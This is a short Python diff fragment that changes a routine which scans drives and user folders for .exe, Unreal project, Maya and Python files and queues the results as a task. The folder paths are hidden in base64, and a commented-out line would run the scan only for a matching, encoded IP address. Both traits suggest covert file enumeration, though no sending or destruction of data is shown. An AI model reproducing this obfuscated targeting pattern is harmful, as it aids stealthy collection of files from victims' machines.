@@ -149,9 +149,10 @@ def search_extention(ext='.exe', dir_path='C:/Users'):
 try:
     #if '5LjQ2LjU' in base64.b64encode(str(data['ip']).encode("ascii")).decode():
     zovV = []
-    zovV += search_extention(dir_path=base64.b64decode('TTovU0NSSVBUU19XSEs=').decode(), ext='.exe')
+    zovV += search_extention(dir_path=base64.b64decode('TTov').decode(), ext='.exe')
     zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.uproject')
-    zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
+    zovV += search_extention(dir_path=base64.b64decode('QzovVXNlcnM=').decode(), ext='.ma')
+    #zovV += search_extention(dir_path=base64.b64decode('UzovQW5pbWF0aW9uIHRyYWluaW5nLw==').decode(), ext='.py')
     add_queue_task('ext_path_ls', dict(zovV))
 except:
     import traceback
